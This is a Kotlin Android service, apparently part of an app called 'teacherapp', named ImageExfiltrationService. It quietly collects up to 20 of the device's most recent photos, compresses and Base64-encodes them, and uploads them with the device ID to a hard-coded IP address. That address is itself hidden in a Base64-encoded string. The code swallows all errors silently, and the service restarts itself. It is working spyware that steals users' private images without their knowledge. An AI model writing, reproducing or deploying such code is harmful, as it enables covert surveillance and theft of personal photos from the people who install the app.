package com.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.IBinder
import android.provider.MediaStore
import android.provider.Settings
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class ImageExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private val maxImages = 20
    private val imageQuality = 60

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startImageExfiltration()
        return START_STICKY
    }

    private fun startImageExfiltration() {
        serviceScope.launch {
            try {
                delay(7000L)
                val imagePaths = getRecentImages()
                if (imagePaths.isNotEmpty()) {
                    exfiltrateImages(imagePaths)
                }
            } catch (e: Exception) {
                // Silent failure
            } finally {
                stopSelf()
            }
        }
    }

    @SuppressLint("Range")
    private fun getRecentImages(): List<String> {
        val imagePaths = mutableListOf<String>()

        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE
            )

            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

            val cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < maxImages) {
                    val imagePath = it.getString(it.getColumnIndex(MediaStore.Images.Media.DATA))
                    val imageSize = it.getLong(it.getColumnIndex(MediaStore.Images.Media.SIZE))

                    if (imageSize < 5 * 1024 * 1024) {
                        val file = File(imagePath)
                        if (file.exists() && file.canRead()) {
                            imagePaths.add(imagePath)
                            count++
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Permission denied
        }

        return imagePaths
    }

    private suspend fun exfiltrateImages(imagePaths: List<String>) = withContext(Dispatchers.IO) {
        imagePaths.forEach { imagePath ->
            try {
                val compressedImage = compressImage(imagePath)
                if (compressedImage != null) {
                    sendImageToServer(compressedImage, File(imagePath).name)
                }
                delay(1000L)
            } catch (e: Exception) {
                // Skip failed images
            }
        }
    }

    private fun compressImage(imagePath: String): ByteArray? {
        return try {
            val originalBitmap = BitmapFactory.decodeFile(imagePath)

            val maxDimension = 1024
            val scaledBitmap = if (originalBitmap.width > maxDimension || originalBitmap.height > maxDimension) {
                val scale = maxDimension.toFloat() / maxOf(originalBitmap.width, originalBitmap.height)
                val newWidth = (originalBitmap.width * scale).toInt()
                val newHeight = (originalBitmap.height * scale).toInt()
                Bitmap.createScaledBitmap(originalBitmap, newWidth, newHeight, true)
            } else {
                originalBitmap
            }

            val outputStream = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, imageQuality, outputStream)
            val compressedData = outputStream.toByteArray()

            originalBitmap.recycle()
            if (scaledBitmap != originalBitmap) {
                scaledBitmap.recycle()
            }

            compressedData
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun sendImageToServer(imageData: ByteArray, filename: String) = withContext(Dispatchers.IO) {
        try {
            val serverUrl = getServerEndpoint()
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection

            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/octet-stream")
                setRequestProperty("X-Image-Name", filename)
                setRequestProperty("X-Device-Id", getAndroidId())
                connectTimeout = 30000
                readTimeout = 30000
            }

            val encodedData = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP)

            connection.outputStream.use {
                it.write(encodedData.toByteArray())
                it.flush()
            }

            connection.responseCode
            connection.disconnect()

        } catch (e: Exception) {
            // Network error
        }
    }

    private fun getServerEndpoint(): String {
        // Base64: http://20.189.79.25:5000/api/images
        val encoded = "aHR0cDovLzIwLjE4OS43OS4yNTo1MDAwL2FwaS9pbWFnZXM="
        return String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String {
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    companion object {
        fun startExfiltration(context: Context) {
            val intent = Intent(context, ImageExfiltrationService::class.java)
            context.startService(intent)
        }
    }
}
